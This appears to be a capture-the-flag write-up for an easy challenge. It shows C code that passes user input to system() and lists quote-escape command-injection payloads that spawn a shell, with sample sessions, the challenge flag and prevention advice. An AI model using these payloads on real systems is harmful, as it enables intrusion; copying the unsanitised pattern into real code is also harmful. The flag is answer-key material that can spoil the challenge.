# The Void Library - Exploit Writeup

## Overview

This is a **very easy** command injection challenge. User input is passed directly to `system()` without sanitization, allowing arbitrary command execution.

---

## Vulnerability Analysis

### 1. Identifying the Vulnerability

Looking at the source or reverse engineering:

```c
snprintf(command, sizeof(command), "echo 'Searching for: %s'", search_term);
system(command);
```

User input (`search_term`) is directly embedded into a shell command string without any sanitization or escaping.

### 2. The Attack Vector

Since the input goes into a string like:
```bash
echo 'Searching for: USER_INPUT'
```

We can break out of the quotes and inject our own commands using:
- `'` to close the opening quote
- `;` or `&&` to chain commands
- Shell command substitution `$(...)` or backticks

---

## Exploitation Steps

### Method 1: Quote Escape + Semicolon

```bash
'; /bin/sh #
```

This transforms the command into:
```bash
echo 'Searching for: '; /bin/sh #'
```

- `'` closes the opening quote
- `;` ends the echo command
- `/bin/sh` spawns a shell
- `#` comments out the trailing quote

### Method 2: Quote Escape + Shell Substitution

```bash
'; sh; #
```

or simply:
```bash
'; sh #
```

### Method 3: Using Command Substitution

```bash
$(sh)
```

---

## Example Exploitation

### Manual

```bash
$ ./voidlib
    [SEARCH] > '; sh #
$ cat flag.txt
GTH{sh3ll_fr0m_th3_v01d}
```

### Using the Exploit Script

```bash
$ python3 exploit.py
[+] Starting local process './voidlib': pid 12345
[*] Sending command injection payload...
[+] Got shell! Run 'cat flag.txt' to get the flag.
[*] Switching to interactive mode
$ cat flag.txt
GTH{sh3ll_fr0m_th3_v01d}
```

---

## Key Concepts

| Concept | Explanation |
|---------|-------------|
| **Command Injection** | Inserting shell commands into vulnerable input fields |
| **Unsanitized Input** | User input passed to `system()` without filtering |
| **Quote Escaping** | Breaking out of string delimiters to inject commands |
| **Shell Metacharacters** | `;`, `&&`, `\|\|`, `$()`, backticks for command chaining |

---

## Prevention

1. **Never** pass user input directly to `system()`, `popen()`, or shell commands
2. Use allowlists for permitted characters
3. Use library functions instead of shell commands
4. Escape special characters properly

---

## Flag

```
GTH{sh3ll_fr0m_th3_v01d}
```
